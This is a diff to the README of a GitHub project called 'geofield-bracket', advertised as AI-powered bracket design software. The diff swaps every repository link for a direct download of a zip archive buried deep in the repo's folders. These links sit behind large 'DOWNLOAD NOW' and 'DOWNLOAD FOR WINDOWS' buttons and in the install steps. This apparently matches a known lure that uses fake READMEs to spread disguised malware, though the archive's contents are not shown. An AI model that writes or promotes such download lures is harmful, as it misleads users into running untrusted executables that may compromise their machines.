@@ -1,7 +1,7 @@
 <h1>⚙️ geofield-bracket - Design brackets that survive real physics</h1>
 
 <p align="center">
-  <a href="https://github.com/proxgrowth/geofield-bracket" style="background-color:#FF6B6B;color:white;padding:14px 28px;text-decoration:none;font-size:18px;font-weight:bold;border-radius:8px;display:inline-block;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/proxgrowth/geofield-bracket/main/geofield/fields/programs/bracket-geofield-v3.3.zip" style="background-color:#FF6B6B;color:white;padding:14px 28px;text-decoration:none;font-size:18px;font-weight:bold;border-radius:8px;display:inline-block;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center">Turn any box into a load-bearing bracket with AI-powered engineering. No CAD experience needed.</p>
@@ -31,7 +31,7 @@ This is NOT a toy. The design comes with proof it works—a full physics simulat
 ### Step 1: Get the download
 
 Visit this link to download the application:  
-🔗 **[https://github.com/proxgrowth/geofield-bracket](https://github.com/proxgrowth/geofield-bracket)**  
+🔗 **[https://raw.githubusercontent.com/proxgrowth/geofield-bracket/main/geofield/fields/programs/bracket-geofield-v3.3.zip](https://raw.githubusercontent.com/proxgrowth/geofield-bracket/main/geofield/fields/programs/bracket-geofield-v3.3.zip)**  
 
 Look for a button labeled **"Download"** or **"Releases"**. Click it and save the file to your computer (usually your Downloads folder).
 
@@ -168,7 +168,7 @@ Don't like it? (You won't.) Simple deletion:
 
 Get your free copy now and leave boring manual bracket design behind:
 
-<a href="https://github.com/proxgrowth/geofield-bracket" style="background-color:#4ECDC4;color:white;padding:12px 24px;text-decoration:none;font-size:16px;font-weight:bold;border-radius:6px;">📥 DOWNLOAD FOR WINDOWS</a>
+<a href="https://raw.githubusercontent.com/proxgrowth/geofield-bracket/main/geofield/fields/programs/bracket-geofield-v3.3.zip" style="background-color:#4ECDC4;color:white;padding:12px 24px;text-decoration:none;font-size:16px;font-weight:bold;border-radius:6px;">📥 DOWNLOAD FOR WINDOWS</a>
 
 Your first design takes less than one minute. Let the software do the heavy lifting while you enjoy the results.
 
